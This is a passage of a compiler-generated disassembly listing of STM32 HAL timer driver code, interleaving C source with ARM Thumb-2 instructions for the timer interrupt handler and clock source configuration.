 8004f40:	e008      	b.n	8004f54 <HAL_TIM_Base_Start_IT+0x8c>
    }
  }
  else
  {
    __HAL_TIM_ENABLE(htim);
 8004f42:	687b      	ldr	r3, [r7, #4]
 8004f44:	681b      	ldr	r3, [r3, #0]
 8004f46:	681a      	ldr	r2, [r3, #0]
 8004f48:	687b      	ldr	r3, [r7, #4]
 8004f4a:	681b      	ldr	r3, [r3, #0]
 8004f4c:	f042 0201 	orr.w	r2, r2, #1
 8004f50:	601a      	str	r2, [r3, #0]
 8004f52:	e000      	b.n	8004f56 <HAL_TIM_Base_Start_IT+0x8e>
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004f54:	bf00      	nop
  }

  /* Return function status */
  return HAL_OK;
 8004f56:	2300      	movs	r3, #0
}
 8004f58:	4618      	mov	r0, r3
 8004f5a:	3714      	adds	r7, #20
 8004f5c:	46bd      	mov	sp, r7
 8004f5e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004f62:	4770      	bx	lr
 8004f64:	40012c00 	.word	0x40012c00
 8004f68:	40014000 	.word	0x40014000
 8004f6c:	00010007 	.word	0x00010007

08004f70 <HAL_TIM_IRQHandler>:
  * @brief  This function handles TIM interrupts requests.
  * @param  htim TIM  handle
  * @retval None
  */
void HAL_TIM_IRQHandler(TIM_HandleTypeDef *htim)
{
 8004f70:	b580      	push	{r7, lr}
 8004f72:	b084      	sub	sp, #16
 8004f74:	af00      	add	r7, sp, #0
 8004f76:	6078      	str	r0, [r7, #4]
  uint32_t itsource = htim->Instance->DIER;
 8004f78:	687b      	ldr	r3, [r7, #4]
 8004f7a:	681b      	ldr	r3, [r3, #0]
 8004f7c:	68db      	ldr	r3, [r3, #12]
 8004f7e:	60fb      	str	r3, [r7, #12]
  uint32_t itflag   = htim->Instance->SR;
 8004f80:	687b      	ldr	r3, [r7, #4]
 8004f82:	681b      	ldr	r3, [r3, #0]
 8004f84:	691b      	ldr	r3, [r3, #16]
 8004f86:	60bb      	str	r3, [r7, #8]

  /* Capture compare 1 event */
  if ((itflag & (TIM_FLAG_CC1)) == (TIM_FLAG_CC1))
 8004f88:	68bb      	ldr	r3, [r7, #8]
 8004f8a:	f003 0302 	and.w	r3, r3, #2
 8004f8e:	2b00      	cmp	r3, #0
 8004f90:	d020      	beq.n	8004fd4 <HAL_TIM_IRQHandler+0x64>
  {
    if ((itsource & (TIM_IT_CC1)) == (TIM_IT_CC1))
 8004f92:	68fb      	ldr	r3, [r7, #12]
 8004f94:	f003 0302 	and.w	r3, r3, #2
 8004f98:	2b00      	cmp	r3, #0
 8004f9a:	d01b      	beq.n	8004fd4 <HAL_TIM_IRQHandler+0x64>
    {
      {
        __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC1);
 8004f9c:	687b      	ldr	r3, [r7, #4]
 8004f9e:	681b      	ldr	r3, [r3, #0]
 8004fa0:	f06f 0202 	mvn.w	r2, #2
 8004fa4:	611a      	str	r2, [r3, #16]
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_1;
 8004fa6:	687b      	ldr	r3, [r7, #4]
 8004fa8:	2201      	movs	r2, #1
 8004faa:	771a      	strb	r2, [r3, #28]

        /* Input capture event */
        if ((htim->Instance->CCMR1 & TIM_CCMR1_CC1S) != 0x00U)
 8004fac:	687b      	ldr	r3, [r7, #4]
 8004fae:	681b      	ldr	r3, [r3, #0]
 8004fb0:	699b      	ldr	r3, [r3, #24]
 8004fb2:	f003 0303 	and.w	r3, r3, #3
 8004fb6:	2b00      	cmp	r3, #0
 8004fb8:	d003      	beq.n	8004fc2 <HAL_TIM_IRQHandler+0x52>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->IC_CaptureCallback(htim);
#else
          HAL_TIM_IC_CaptureCallback(htim);
 8004fba:	6878      	ldr	r0, [r7, #4]
 8004fbc:	f000 f9ad 	bl	800531a <HAL_TIM_IC_CaptureCallback>
 8004fc0:	e005      	b.n	8004fce <HAL_TIM_IRQHandler+0x5e>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->OC_DelayElapsedCallback(htim);
          htim->PWM_PulseFinishedCallback(htim);
#else
          HAL_TIM_OC_DelayElapsedCallback(htim);
 8004fc2:	6878      	ldr	r0, [r7, #4]
 8004fc4:	f000 f99f 	bl	8005306 <HAL_TIM_OC_DelayElapsedCallback>
          HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004fc8:	6878      	ldr	r0, [r7, #4]
 8004fca:	f000 f9b0 	bl	800532e <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
        }
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004fce:	687b      	ldr	r3, [r7, #4]
 8004fd0:	2200      	movs	r2, #0
 8004fd2:	771a      	strb	r2, [r3, #28]
      }
    }
  }
  /* Capture compare 2 event */
  if ((itflag & (TIM_FLAG_CC2)) == (TIM_FLAG_CC2))
 8004fd4:	68bb      	ldr	r3, [r7, #8]
 8004fd6:	f003 0304 	and.w	r3, r3, #4
 8004fda:	2b00      	cmp	r3, #0
 8004fdc:	d020      	beq.n	8005020 <HAL_TIM_IRQHandler+0xb0>
  {
    if ((itsource & (TIM_IT_CC2)) == (TIM_IT_CC2))
 8004fde:	68fb      	ldr	r3, [r7, #12]
 8004fe0:	f003 0304 	and.w	r3, r3, #4
 8004fe4:	2b00      	cmp	r3, #0
 8004fe6:	d01b      	beq.n	8005020 <HAL_TIM_IRQHandler+0xb0>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC2);
 8004fe8:	687b      	ldr	r3, [r7, #4]
 8004fea:	681b      	ldr	r3, [r3, #0]
 8004fec:	f06f 0204 	mvn.w	r2, #4
 8004ff0:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_2;
 8004ff2:	687b      	ldr	r3, [r7, #4]
 8004ff4:	2202      	movs	r2, #2
 8004ff6:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR1 & TIM_CCMR1_CC2S) != 0x00U)
 8004ff8:	687b      	ldr	r3, [r7, #4]
 8004ffa:	681b      	ldr	r3, [r3, #0]
 8004ffc:	699b      	ldr	r3, [r3, #24]
 8004ffe:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8005002:	2b00      	cmp	r3, #0
 8005004:	d003      	beq.n	800500e <HAL_TIM_IRQHandler+0x9e>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8005006:	6878      	ldr	r0, [r7, #4]
 8005008:	f000 f987 	bl	800531a <HAL_TIM_IC_CaptureCallback>
 800500c:	e005      	b.n	800501a <HAL_TIM_IRQHandler+0xaa>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 800500e:	6878      	ldr	r0, [r7, #4]
 8005010:	f000 f979 	bl	8005306 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8005014:	6878      	ldr	r0, [r7, #4]
 8005016:	f000 f98a 	bl	800532e <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 800501a:	687b      	ldr	r3, [r7, #4]
 800501c:	2200      	movs	r2, #0
 800501e:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 3 event */
  if ((itflag & (TIM_FLAG_CC3)) == (TIM_FLAG_CC3))
 8005020:	68bb      	ldr	r3, [r7, #8]
 8005022:	f003 0308 	and.w	r3, r3, #8
 8005026:	2b00      	cmp	r3, #0
 8005028:	d020      	beq.n	800506c <HAL_TIM_IRQHandler+0xfc>
  {
    if ((itsource & (TIM_IT_CC3)) == (TIM_IT_CC3))
 800502a:	68fb      	ldr	r3, [r7, #12]
 800502c:	f003 0308 	and.w	r3, r3, #8
 8005030:	2b00      	cmp	r3, #0
 8005032:	d01b      	beq.n	800506c <HAL_TIM_IRQHandler+0xfc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC3);
 8005034:	687b      	ldr	r3, [r7, #4]
 8005036:	681b      	ldr	r3, [r3, #0]
 8005038:	f06f 0208 	mvn.w	r2, #8
 800503c:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_3;
 800503e:	687b      	ldr	r3, [r7, #4]
 8005040:	2204      	movs	r2, #4
 8005042:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC3S) != 0x00U)
 8005044:	687b      	ldr	r3, [r7, #4]
 8005046:	681b      	ldr	r3, [r3, #0]
 8005048:	69db      	ldr	r3, [r3, #28]
 800504a:	f003 0303 	and.w	r3, r3, #3
 800504e:	2b00      	cmp	r3, #0
 8005050:	d003      	beq.n	800505a <HAL_TIM_IRQHandler+0xea>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8005052:	6878      	ldr	r0, [r7, #4]
 8005054:	f000 f961 	bl	800531a <HAL_TIM_IC_CaptureCallback>
 8005058:	e005      	b.n	8005066 <HAL_TIM_IRQHandler+0xf6>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 800505a:	6878      	ldr	r0, [r7, #4]
 800505c:	f000 f953 	bl	8005306 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8005060:	6878      	ldr	r0, [r7, #4]
 8005062:	f000 f964 	bl	800532e <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8005066:	687b      	ldr	r3, [r7, #4]
 8005068:	2200      	movs	r2, #0
 800506a:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 4 event */
  if ((itflag & (TIM_FLAG_CC4)) == (TIM_FLAG_CC4))
 800506c:	68bb      	ldr	r3, [r7, #8]
 800506e:	f003 0310 	and.w	r3, r3, #16
 8005072:	2b00      	cmp	r3, #0
 8005074:	d020      	beq.n	80050b8 <HAL_TIM_IRQHandler+0x148>
  {
    if ((itsource & (TIM_IT_CC4)) == (TIM_IT_CC4))
 8005076:	68fb      	ldr	r3, [r7, #12]
 8005078:	f003 0310 	and.w	r3, r3, #16
 800507c:	2b00      	cmp	r3, #0
 800507e:	d01b      	beq.n	80050b8 <HAL_TIM_IRQHandler+0x148>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC4);
 8005080:	687b      	ldr	r3, [r7, #4]
 8005082:	681b      	ldr	r3, [r3, #0]
 8005084:	f06f 0210 	mvn.w	r2, #16
 8005088:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_4;
 800508a:	687b      	ldr	r3, [r7, #4]
 800508c:	2208      	movs	r2, #8
 800508e:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC4S) != 0x00U)
 8005090:	687b      	ldr	r3, [r7, #4]
 8005092:	681b      	ldr	r3, [r3, #0]
 8005094:	69db      	ldr	r3, [r3, #28]
 8005096:	f403 7340 	and.w	r3, r3, #768	; 0x300
 800509a:	2b00      	cmp	r3, #0
 800509c:	d003      	beq.n	80050a6 <HAL_TIM_IRQHandler+0x136>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 800509e:	6878      	ldr	r0, [r7, #4]
 80050a0:	f000 f93b 	bl	800531a <HAL_TIM_IC_CaptureCallback>
 80050a4:	e005      	b.n	80050b2 <HAL_TIM_IRQHandler+0x142>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 80050a6:	6878      	ldr	r0, [r7, #4]
 80050a8:	f000 f92d 	bl	8005306 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 80050ac:	6878      	ldr	r0, [r7, #4]
 80050ae:	f000 f93e 	bl	800532e <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 80050b2:	687b      	ldr	r3, [r7, #4]
 80050b4:	2200      	movs	r2, #0
 80050b6:	771a      	strb	r2, [r3, #28]
    }
  }
  /* TIM Update event */
  if ((itflag & (TIM_FLAG_UPDATE)) == (TIM_FLAG_UPDATE))
 80050b8:	68bb      	ldr	r3, [r7, #8]
 80050ba:	f003 0301 	and.w	r3, r3, #1
 80050be:	2b00      	cmp	r3, #0
 80050c0:	d00c      	beq.n	80050dc <HAL_TIM_IRQHandler+0x16c>
  {
    if ((itsource & (TIM_IT_UPDATE)) == (TIM_IT_UPDATE))
 80050c2:	68fb      	ldr	r3, [r7, #12]
 80050c4:	f003 0301 	and.w	r3, r3, #1
 80050c8:	2b00      	cmp	r3, #0
 80050ca:	d007      	beq.n	80050dc <HAL_TIM_IRQHandler+0x16c>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_UPDATE);
 80050cc:	687b      	ldr	r3, [r7, #4]
 80050ce:	681b      	ldr	r3, [r3, #0]
 80050d0:	f06f 0201 	mvn.w	r2, #1
 80050d4:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->PeriodElapsedCallback(htim);
#else
      HAL_TIM_PeriodElapsedCallback(htim);
 80050d6:	6878      	ldr	r0, [r7, #4]
 80050d8:	f7fb fe64 	bl	8000da4 <HAL_TIM_PeriodElapsedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break input event */
  if ((itflag & (TIM_FLAG_BREAK)) == (TIM_FLAG_BREAK))
 80050dc:	68bb      	ldr	r3, [r7, #8]
 80050de:	f003 0380 	and.w	r3, r3, #128	; 0x80
 80050e2:	2b00      	cmp	r3, #0
 80050e4:	d00c      	beq.n	8005100 <HAL_TIM_IRQHandler+0x190>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 80050e6:	68fb      	ldr	r3, [r7, #12]
 80050e8:	f003 0380 	and.w	r3, r3, #128	; 0x80
 80050ec:	2b00      	cmp	r3, #0
 80050ee:	d007      	beq.n	8005100 <HAL_TIM_IRQHandler+0x190>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_BREAK);
 80050f0:	687b      	ldr	r3, [r7, #4]
 80050f2:	681b      	ldr	r3, [r3, #0]
 80050f4:	f06f 0280 	mvn.w	r2, #128	; 0x80
 80050f8:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->BreakCallback(htim);
#else
      HAL_TIMEx_BreakCallback(htim);
 80050fa:	6878      	ldr	r0, [r7, #4]
 80050fc:	f000 fa9a 	bl	8005634 <HAL_TIMEx_BreakCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break2 input event */
  if ((itflag & (TIM_FLAG_BREAK2)) == (TIM_FLAG_BREAK2))
 8005100:	68bb      	ldr	r3, [r7, #8]
 8005102:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8005106:	2b00      	cmp	r3, #0
 8005108:	d00c      	beq.n	8005124 <HAL_TIM_IRQHandler+0x1b4>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 800510a:	68fb      	ldr	r3, [r7, #12]
 800510c:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8005110:	2b00      	cmp	r3, #0
 8005112:	d007      	beq.n	8005124 <HAL_TIM_IRQHandler+0x1b4>
    {
      __HAL_TIM_CLEAR_FLAG(htim, TIM_FLAG_BREAK2);
 8005114:	687b      	ldr	r3, [r7, #4]
 8005116:	681b      	ldr	r3, [r3, #0]
 8005118:	f46f 7280 	mvn.w	r2, #256	; 0x100
 800511c:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->Break2Callback(htim);
#else
      HAL_TIMEx_Break2Callback(htim);
 800511e:	6878      	ldr	r0, [r7, #4]
 8005120:	f000 fa92 	bl	8005648 <HAL_TIMEx_Break2Callback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Trigger detection event */
  if ((itflag & (TIM_FLAG_TRIGGER)) == (TIM_FLAG_TRIGGER))
 8005124:	68bb      	ldr	r3, [r7, #8]
 8005126:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800512a:	2b00      	cmp	r3, #0
 800512c:	d00c      	beq.n	8005148 <HAL_TIM_IRQHandler+0x1d8>
  {
    if ((itsource & (TIM_IT_TRIGGER)) == (TIM_IT_TRIGGER))
 800512e:	68fb      	ldr	r3, [r7, #12]
 8005130:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8005134:	2b00      	cmp	r3, #0
 8005136:	d007      	beq.n	8005148 <HAL_TIM_IRQHandler+0x1d8>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_TRIGGER);
 8005138:	687b      	ldr	r3, [r7, #4]
 800513a:	681b      	ldr	r3, [r3, #0]
 800513c:	f06f 0240 	mvn.w	r2, #64	; 0x40
 8005140:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->TriggerCallback(htim);
#else
      HAL_TIM_TriggerCallback(htim);
 8005142:	6878      	ldr	r0, [r7, #4]
 8005144:	f000 f8fd 	bl	8005342 <HAL_TIM_TriggerCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM commutation event */
  if ((itflag & (TIM_FLAG_COM)) == (TIM_FLAG_COM))
 8005148:	68bb      	ldr	r3, [r7, #8]
 800514a:	f003 0320 	and.w	r3, r3, #32
 800514e:	2b00      	cmp	r3, #0
 8005150:	d00c      	beq.n	800516c <HAL_TIM_IRQHandler+0x1fc>
  {
    if ((itsource & (TIM_IT_COM)) == (TIM_IT_COM))
 8005152:	68fb      	ldr	r3, [r7, #12]
 8005154:	f003 0320 	and.w	r3, r3, #32
 8005158:	2b00      	cmp	r3, #0
 800515a:	d007      	beq.n	800516c <HAL_TIM_IRQHandler+0x1fc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_FLAG_COM);
 800515c:	687b      	ldr	r3, [r7, #4]
 800515e:	681b      	ldr	r3, [r3, #0]
 8005160:	f06f 0220 	mvn.w	r2, #32
 8005164:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->CommutationCallback(htim);
#else
      HAL_TIMEx_CommutCallback(htim);
 8005166:	6878      	ldr	r0, [r7, #4]
 8005168:	f000 fa5a 	bl	8005620 <HAL_TIMEx_CommutCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
}
 800516c:	bf00      	nop
 800516e:	3710      	adds	r7, #16
 8005170:	46bd      	mov	sp, r7
 8005172:	bd80      	pop	{r7, pc}

08005174 <HAL_TIM_ConfigClockSource>:
  * @param  sClockSourceConfig pointer to a TIM_ClockConfigTypeDef structure that
  *         contains the clock source information for the TIM peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_ConfigClockSource(TIM_HandleTypeDef *htim, const TIM_ClockConfigTypeDef *sClockSourceConfig)
{
 8005174:	b580      	push	{r7, lr}
 8005176:	b084      	sub	sp, #16
 8005178:	af00      	add	r7, sp, #0
 800517a:	6078      	str	r0, [r7, #4]
 800517c:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status = HAL_OK;
 800517e:	2300      	movs	r3, #0
 8005180:	73fb      	strb	r3, [r7, #15]
  uint32_t tmpsmcr;

  /* Process Locked */
  __HAL_LOCK(htim);
 8005182:	687b      	ldr	r3, [r7, #4]
 8005184:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 8005188:	2b01      	cmp	r3, #1
 800518a:	d101      	bne.n	8005190 <HAL_TIM_ConfigClockSource+0x1c>
 800518c:	2302      	movs	r3, #2
 800518e:	e0b6      	b.n	80052fe <HAL_TIM_ConfigClockSource+0x18a>
 8005190:	687b      	ldr	r3, [r7, #4]
 8005192:	2201      	movs	r2, #1
 8005194:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  htim->State = HAL_TIM_STATE_BUSY;
 8005198:	687b      	ldr	r3, [r7, #4]
 800519a:	2202      	movs	r2, #2
 800519c:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Check the parameters */
  assert_param(IS_TIM_CLOCKSOURCE(sClockSourceConfig->ClockSource));

  /* Reset the SMS, TS, ECE, ETPS and ETRF bits */
  tmpsmcr = htim->Instance->SMCR;
 80051a0:	687b      	ldr	r3, [r7, #4]
 80051a2:	681b      	ldr	r3, [r3, #0]
 80051a4:	689b      	ldr	r3, [r3, #8]
 80051a6:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_SMS | TIM_SMCR_TS);
 80051a8:	68bb      	ldr	r3, [r7, #8]
 80051aa:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 80051ae:	f023 0377 	bic.w	r3, r3, #119	; 0x77
 80051b2:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 80051b4:	68bb      	ldr	r3, [r7, #8]
 80051b6:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 80051ba:	60bb      	str	r3, [r7, #8]
  htim->Instance->SMCR = tmpsmcr;
 80051bc:	687b      	ldr	r3, [r7, #4]
 80051be:	681b      	ldr	r3, [r3, #0]
 80051c0:	68ba      	ldr	r2, [r7, #8]
 80051c2:	609a      	str	r2, [r3, #8]

  switch (sClockSourceConfig->ClockSource)
 80051c4:	683b      	ldr	r3, [r7, #0]
 80051c6:	681b      	ldr	r3, [r3, #0]
 80051c8:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 80051cc:	d03e      	beq.n	800524c <HAL_TIM_ConfigClockSource+0xd8>
 80051ce:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 80051d2:	f200 8087 	bhi.w	80052e4 <HAL_TIM_ConfigClockSource+0x170>
 80051d6:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 80051da:	f000 8086 	beq.w	80052ea <HAL_TIM_ConfigClockSource+0x176>
 80051de:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 80051e2:	d87f      	bhi.n	80052e4 <HAL_TIM_ConfigClockSource+0x170>
 80051e4:	2b70      	cmp	r3, #112	; 0x70
 80051e6:	d01a      	beq.n	800521e <HAL_TIM_ConfigClockSource+0xaa>
 80051e8:	2b70      	cmp	r3, #112	; 0x70
 80051ea:	d87b      	bhi.n	80052e4 <HAL_TIM_ConfigClockSource+0x170>
 80051ec:	2b60      	cmp	r3, #96	; 0x60
 80051ee:	d050      	beq.n	8005292 <HAL_TIM_ConfigClockSource+0x11e>
 80051f0:	2b60      	cmp	r3, #96	; 0x60
 80051f2:	d877      	bhi.n	80052e4 <HAL_TIM_ConfigClockSource+0x170>
 80051f4:	2b50      	cmp	r3, #80	; 0x50
 80051f6:	d03c      	beq.n	8005272 <HAL_TIM_ConfigClockSource+0xfe>
 80051f8:	2b50      	cmp	r3, #80	; 0x50
 80051fa:	d873      	bhi.n	80052e4 <HAL_TIM_ConfigClockSource+0x170>
 80051fc:	2b40      	cmp	r3, #64	; 0x40
 80051fe:	d058      	beq.n	80052b2 <HAL_TIM_ConfigClockSource+0x13e>
 8005200:	2b40      	cmp	r3, #64	; 0x40
 8005202:	d86f      	bhi.n	80052e4 <HAL_TIM_ConfigClockSource+0x170>
 8005204:	2b30      	cmp	r3, #48	; 0x30
 8005206:	d064      	beq.n	80052d2 <HAL_TIM_ConfigClockSource+0x15e>
 8005208:	2b30      	cmp	r3, #48	; 0x30
 800520a:	d86b      	bhi.n	80052e4 <HAL_TIM_ConfigClockSource+0x170>
 800520c:	2b20      	cmp	r3, #32
 800520e:	d060      	beq.n	80052d2 <HAL_TIM_ConfigClockSource+0x15e>
 8005210:	2b20      	cmp	r3, #32
 8005212:	d867      	bhi.n	80052e4 <HAL_TIM_ConfigClockSource+0x170>
 8005214:	2b00      	cmp	r3, #0
 8005216:	d05c      	beq.n	80052d2 <HAL_TIM_ConfigClockSource+0x15e>
 8005218:	2b10      	cmp	r3, #16
 800521a:	d05a      	beq.n	80052d2 <HAL_TIM_ConfigClockSource+0x15e>
 800521c:	e062      	b.n	80052e4 <HAL_TIM_ConfigClockSource+0x170>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 800521e:	687b      	ldr	r3, [r7, #4]
 8005220:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 8005222:	683b      	ldr	r3, [r7, #0]
 8005224:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 8005226:	683b      	ldr	r3, [r7, #0]
 8005228:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 800522a:	683b      	ldr	r3, [r7, #0]
 800522c:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 800522e:	f000 f971 	bl	8005514 <TIM_ETR_SetConfig>

      /* Select the External clock mode1 and the ETRF trigger */
      tmpsmcr = htim->Instance->SMCR;
 8005232:	687b      	ldr	r3, [r7, #4]
 8005234:	681b      	ldr	r3, [r3, #0]
 8005236:	689b      	ldr	r3, [r3, #8]
 8005238:	60bb      	str	r3, [r7, #8]
      tmpsmcr |= (TIM_SLAVEMODE_EXTERNAL1 | TIM_CLOCKSOURCE_ETRMODE1);
 800523a:	68bb      	ldr	r3, [r7, #8]
 800523c:	f043 0377 	orr.w	r3, r3, #119	; 0x77
 8005240:	60bb      	str	r3, [r7, #8]
      /* Write to TIMx SMCR */
      htim->Instance->SMCR = tmpsmcr;
 8005242:	687b      	ldr	r3, [r7, #4]
 8005244:	681b      	ldr	r3, [r3, #0]
 8005246:	68ba      	ldr	r2, [r7, #8]
 8005248:	609a      	str	r2, [r3, #8]
      break;
 800524a:	e04f      	b.n	80052ec <HAL_TIM_ConfigClockSource+0x178>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 800524c:	687b      	ldr	r3, [r7, #4]
 800524e:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 8005250:	683b      	ldr	r3, [r7, #0]
 8005252:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 8005254:	683b      	ldr	r3, [r7, #0]
 8005256:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 8005258:	683b      	ldr	r3, [r7, #0]
 800525a:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 800525c:	f000 f95a 	bl	8005514 <TIM_ETR_SetConfig>
      /* Enable the External clock mode2 */
      htim->Instance->SMCR |= TIM_SMCR_ECE;
 8005260:	687b      	ldr	r3, [r7, #4]
 8005262:	681b      	ldr	r3, [r3, #0]
 8005264:	689a      	ldr	r2, [r3, #8]
 8005266:	687b      	ldr	r3, [r7, #4]
 8005268:	681b      	ldr	r3, [r3, #0]
 800526a:	f442 4280 	orr.w	r2, r2, #16384	; 0x4000
 800526e:	609a      	str	r2, [r3, #8]
      break;
 8005270:	e03c      	b.n	80052ec <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 8005272:	687b      	ldr	r3, [r7, #4]
 8005274:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 8005276:	683b      	ldr	r3, [r7, #0]
 8005278:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 800527a:	683b      	ldr	r3, [r7, #0]
 800527c:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 800527e:	461a      	mov	r2, r3
 8005280:	f000 f8ce 	bl	8005420 <TIM_TI1_ConfigInputStage>
